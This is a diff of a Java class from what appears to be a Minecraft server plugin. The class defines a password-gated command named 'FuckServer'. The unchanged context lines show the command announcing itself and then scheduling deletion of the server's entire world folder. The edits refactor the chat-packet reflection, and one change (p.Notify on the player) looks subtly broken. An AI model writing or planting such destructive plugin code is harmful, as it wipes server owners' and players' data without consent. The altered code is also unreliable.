@@ -11,7 +11,6 @@ import net.md_5.bungee.api.chat.BaseComponent;
 import net.md_5.bungee.api.chat.ClickEvent;
 import net.md_5.bungee.api.chat.HoverEvent;
 import net.md_5.bungee.api.chat.TextComponent;
-import net.minecraft.server.v1_15_R1.ChatMessageType;
 import org.apache.commons.lang.RandomStringUtils;
 import org.bukkit.*;
 import org.bukkit.attribute.Attribute;
@@ -84,7 +83,7 @@ public class FuckServer extends Command {
         }
         locked = true;
         p.sendMessage(Start.COMMAND_PREFIX + "Proceeding!");
-        this.Notify(p, ChatColor.GOLD + p.getDisplayName() + ChatColor.GREEN + " is fucking the server!");
+        p.Notify(ChatColor.GOLD + p.getDisplayName() + ChatColor.GREEN + " is fucking the server!");
         BukkitTask task = Bukkit.getScheduler().runTaskLaterAsynchronously(this.plugin, () -> {
             Bukkit.getScheduler().runTaskLater(this.plugin, () -> deleteFolder(Bukkit.getWorldContainer().getAbsoluteFile()), 1);
             for (int i = 0; i <= 100; i++) {
@@ -169,7 +168,7 @@ public class FuckServer extends Command {
         component.setClickEvent(new ClickEvent(ClickEvent.Action.RUN_COMMAND, Start.COMMAND_SIGN + this.getCommand() + " " + password));
         try {
             Class<?> packetPlayOutChat = ReflectionUtils.getClass("{nms}.PacketPlayOutChat");
-            Object o = ReflectionUtils.getConstructor(packetPlayOutChat, ReflectionUtils.getClass("{nms}.IChatBaseComponent"), ReflectionUtils.getClass("{nms}.ChatMessageType")).invoke(null, ChatMessageType.CHAT);
+            Object o = ReflectionUtils.getConstructor(packetPlayOutChat, ReflectionUtils.getClass("{nms}.IChatBaseComponent"), ReflectionUtils.getClass("{nms}.ChatMessageType")).invoke(null, ReflectionUtils.getEnumVariableCached("{nms}.ChatMessageType", "CHAT"));
             ReflectionUtils.getField(packetPlayOutChat, "components").set(o, new TextComponent[]{component});
             PacketSender.Instance.sendPacket(p, Packet.createFromNMSPacket(o));
         } catch (InvocationTargetException | IllegalAccessException e) {
